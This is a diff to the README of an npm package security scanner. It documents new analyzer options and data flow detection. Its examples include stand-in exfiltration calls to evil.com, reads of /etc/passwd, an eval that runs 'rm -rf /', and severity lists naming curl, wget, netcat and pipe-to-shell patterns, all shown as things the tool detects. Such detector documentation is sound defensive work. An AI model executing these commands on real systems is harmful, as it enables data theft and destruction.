@@ -129,6 +129,7 @@ node bin.js [options]
 - `--concurrency <n>`: Maximum number of concurrent package analyses (defaults to number of CPU cores).
 - `--json <path>`: Output the analysis report as JSON to the specified file.
 - `--yaml <path>`: Output the analysis report as YAML to the specified file.
+- `--report-level <level>`: Minimum severity level to report (`critical`, `high`, `medium`, `low`). Overrides the config file setting.
 - `--benchmark`: Show detailed timing information for each analyzer and phase. Useful for performance profiling and identifying slow analyzers.
 
 ## Performance
@@ -305,28 +306,28 @@ Example:
 
 ### Analyzer Reference
 
-| Analyzer      | Description                                                                                                          |
-| ------------- | -------------------------------------------------------------------------------------------------------------------- |
-| `cve`         | Checks packages against OSV.dev database for known CVEs and security advisories. Configurable timeout.               |
-| `deprecated`  | Detects packages marked as deprecated in the npm registry.                                                           |
-| `env`         | Detects access to environment variables (`process.env`). Supports `allowedEnvVars` whitelist with sensible defaults. |
-| `network`     | Detects network requests. Supports `allowedHosts` whitelist with sensible defaults.                                  |
-| `eval`        | Flags `eval()` and `new Function()` usage.                                                                           |
-| `obfuscation` | Detects suspiciously long strings (potential obfuscation). Configurable `minStringLength`.                           |
-| `fs`          | Detects access to sensitive paths. Supports `additionalDangerousPaths`.                                              |
-| `typosquat`   | Identifies packages with names similar to popular libraries.                                                         |
-| `cooldown`    | Flags newly published packages. Configurable `hoursSincePublish`.                                                    |
-| `dormant`     | Alerts on packages updated after long inactivity. Configurable `daysSincePreviousPublish`.                           |
-| `dynamic`     | Detects `vm.runInContext()` and dynamic require patterns.                                                            |
-| `buffer`      | Flags suspicious `Buffer.from()` usage. Configurable `minBufferLength`.                                              |
-| `reputation`  | Checks maintainer count and publisher trustworthiness. Supports `whitelistedUsers`.                                  |
-| `scripts`     | Flags suspicious lifecycle scripts (install, postinstall, preinstall).                                               |
-| `process`     | Detects child process spawning and low-level spawn calls.                                                            |
-| `native`      | Alerts on packages with native bindings.                                                                             |
-| `secrets`     | Identifies hardcoded credentials (AWS keys, private keys, API tokens).                                               |
-| `metadata`    | Flags collection of system information (`os.userInfo()`, network interfaces).                                        |
-| `pollution`   | Detects prototype pollution attempts.                                                                                |
-| `minified`    | Identifies minified or obfuscated code.                                                                              |
+| Analyzer      | Description                                                                                                               |
+| ------------- | ------------------------------------------------------------------------------------------------------------------------- |
+| `cve`         | Checks packages against OSV.dev database for known CVEs and security advisories. Configurable timeout.                    |
+| `deprecated`  | Detects packages marked as deprecated in the npm registry.                                                                |
+| `env`         | Detects access to environment variables (`process.env`). Supports `allowedEnvVars` whitelist with sensible defaults.      |
+| `network`     | Detects network requests. Supports `allowedHosts` whitelist with sensible defaults.                                       |
+| `eval`        | Flags `eval()`, `new Function()`, and `setTimeout/setInterval` with strings. Severity based on content.                   |
+| `obfuscation` | Detects suspiciously long strings (potential obfuscation). Configurable `minStringLength`.                                |
+| `fs`          | Detects access to sensitive paths. Supports `additionalDangerousPaths`.                                                   |
+| `typosquat`   | Identifies packages with names similar to popular libraries.                                                              |
+| `cooldown`    | Flags newly published packages. Configurable `hoursSincePublish`.                                                         |
+| `dormant`     | Alerts on packages updated after long inactivity. Configurable `daysSincePreviousPublish`.                                |
+| `dynamic`     | Detects `vm.runInContext()` and dynamic require patterns.                                                                 |
+| `buffer`      | Flags suspicious `Buffer.from()` usage. Configurable `minBufferLength`.                                                   |
+| `reputation`  | Checks maintainer count and publisher trustworthiness. Supports `whitelistedUsers`.                                       |
+| `scripts`     | Flags suspicious lifecycle scripts (install, postinstall, preinstall). Supports `allowedCommands` with sensible defaults. |
+| `process`     | Detects child process spawning and low-level spawn calls. Uses data flow analysis to resolve variables.                   |
+| `native`      | Alerts on packages with native bindings.                                                                                  |
+| `secrets`     | Identifies hardcoded credentials (AWS keys, private keys, API tokens).                                                    |
+| `metadata`    | Flags collection of system information (`os.userInfo()`, network interfaces).                                             |
+| `pollution`   | Detects prototype pollution attempts.                                                                                     |
+| `minified`    | Identifies minified or obfuscated code.                                                                                   |
 
 ### CVE Analyzer Configuration
 
@@ -413,11 +414,51 @@ You can override the defaults with your own whitelist:
 | -------------- | -------- | ------------------- | ----------------------------------------------- |
 | `allowedHosts` | string[] | (common safe hosts) | Hosts to ignore when network requests are made. |
 
+**Data Flow Analysis:**
+The analyzer uses data flow analysis to resolve URLs stored in variables, template literals, and string concatenation:
+
+```javascript
+// Direct URL - detected
+fetch("http://evil.com/steal");
+
+// Variable - resolved via data flow analysis
+const url = "http://evil.com/steal";
+fetch(url); // Detected
+
+// Template literal - resolved
+const host = "evil.com";
+fetch(`http://${host}/steal`); // Detected
+```
+
 **Note**: The analyzer only flags actual network function calls (like `fetch()`, `axios.get()`, `http.request()`). URL strings in configuration objects or templates are not flagged.
 
 ### Fs Analyzer Configuration
 
-The `fs` analyzer detects suspicious file system access. By default, it checks for sensitive paths like `/etc/passwd`, `.ssh`, `.npmrc`, `/proc/self/environ`, and lock files. You can add additional paths to monitor:
+The `fs` analyzer detects suspicious file system access. By default, it checks for sensitive paths like `/etc/passwd`, `.ssh`, `.npmrc`, `/proc/self/environ`, and lock files. The analyzer uses **data flow analysis** to resolve paths stored in variables, template literals, string concatenation, and object properties.
+
+**Data Flow Examples:**
+
+```javascript
+// Direct path - detected
+fs.readFileSync("/etc/passwd");
+
+// Variable - resolved via data flow analysis
+const path = "/etc/passwd";
+fs.readFile(path); // Detected
+
+// Template literal - resolved
+const base = "/etc";
+fs.readFile(`${base}/passwd`); // Detected
+
+// String concatenation - resolved
+fs.readFile("/etc" + "/passwd"); // Detected
+
+// Object property - resolved
+const config = { path: "/etc/passwd" };
+fs.readFile(config.path); // Detected
+```
+
+You can add additional paths to monitor:
 
 ```json
 {
@@ -573,6 +614,104 @@ The `reputation` analyzer can be configured to whitelist specific users (such as
 ```
 
 This is useful for allowing packages published by bots like GitHub Actions, Renovate, or Release Please to bypass reputation checks.
+
+### Scripts Analyzer Configuration
+
+The `scripts` analyzer flags suspicious lifecycle scripts (preinstall, install, postinstall). By default, common safe commands used by legitimate packages are whitelisted:
+
+**Default Allowed Commands:**
+`npm`, `npx`, `yarn`, `pnpm`, `node-gyp`, `node-gyp-build`, `prebuild-install`, `husky`, `lerna`, `tsc`, `rimraf`, `mkdirp`, `ncp`, `cpy-cli`, `shx`, `cross-env`, `patch-package`, `is-ci-cli`
+
+You can override the defaults with your own whitelist:
+
+```json
+{
+  "analyzers": {
+    "scripts": {
+      "allowedCommands": ["npm", "yarn", "node-gyp", "my-build-tool"]
+    }
+  }
+}
+```
+
+| Property          | Type     | Default                              | Description                              |
+| ----------------- | -------- | ------------------------------------ | ---------------------------------------- |
+| `allowedCommands` | string[] | (common safe build/install commands) | Commands to ignore in lifecycle scripts. |
+
+**Severity Classification:**
+The scripts analyzer assigns severity based on script content:
+
+- **Critical**: Scripts containing `curl`, `wget`, `bash -c`, `sh -c`, `eval`, `>`, or pipe commands with URLs
+- **High**: Other potentially dangerous scripts
+- **Medium**: Scripts with less risky operations
+
+### Eval Analyzer Configuration
+
+The `eval` analyzer detects dynamic code execution via `eval()`, `new Function()`, and `setTimeout/setInterval` with string arguments. Severity is determined by analyzing the content being evaluated.
+
+**Severity Classification:**
+
+- **Critical**: Content contains suspicious patterns:
+  - URLs (`://`, `file://`, `data:`)
+  - Code execution (`eval(`, `require(`, `exec(`, `spawn(`, `process.`, `child_process`, `fs.`, `Buffer.`)
+  - Network operations (`fetch(`, `XMLHttpRequest`, `WebSocket`)
+  - Obfuscation (`\x`, `\u00`, `fromCharCode`, `atob(`, `btoa(`)
+
+- **Medium**: Safe/common patterns used by legitimate libraries:
+  - `return this` (common pattern to get global object)
+  - `return function`, `use strict`, `return arguments`
+  - Short, simple content (< 50 characters without semicolons)
+
+- **High**: Everything else (dynamic content that can't be resolved, longer code)
+
+**Examples:**
+
+```javascript
+// Medium severity - common safe pattern
+new Function("return this")();
+
+// Critical severity - contains network URL
+new Function("fetch('http://evil.com')")();
+
+// Critical severity - contains code execution
+eval("require('child_process').exec('rm -rf /')");
+
+// Medium severity - simple content
+eval("1 + 1");
+```
+
+### Process Analyzer Configuration
+
+The `process` analyzer detects child process spawning (`exec`, `spawn`, `fork`, etc.) and low-level process binding calls. It uses **data flow analysis** to resolve the command being executed, even when stored in variables or object properties.
+
+**Data Flow Examples:**
+
+```javascript
+// Direct call - detected
+exec("curl http://evil.com");
+
+// Variable - resolved via data flow analysis
+const cmd = "curl http://evil.com";
+exec(cmd); // Detected as critical (curl)
+
+// Object property - resolved via data flow analysis
+const config = { binary: "bash" };
+spawn(config.binary); // Detected as critical (bash)
+```
+
+**Severity Classification:**
+The process analyzer classifies severity based on the executed binary:
+
+- **Critical**: `curl`, `wget`, `nc`, `netcat`, `bash`, `sh`, `zsh`, `fish`, `cmd`, `powershell`, `pwsh`, `python`, `perl`, `ruby`, `php`, `eval`
+- **High**: `node`, `npm`, `npx`, `yarn`, `pnpm`, `bun`, `deno`, `git`, `make`, `cmake`, `cargo`, `go`, `rustc`, `gcc`, `g++`, `clang`, `javac`, `java`
+- **Medium**: `cp`, `mv`, `rm`, `mkdir`, `rmdir`, `chmod`, `chown`, `cat`, `echo`, `ls`, `dir`, `find`, `grep`, `sed`, `awk`, `tar`, `gzip`, `zip`, `unzip`
+
+Additionally, critical severity is assigned for:
+
+- Commands containing URLs (`://`)
+- Pipe chains (`|`)
+- Shell injection patterns (`|bash`, `|sh`)
+- `process.binding('spawn_sync')` calls
 
 ## Supported Platforms
 
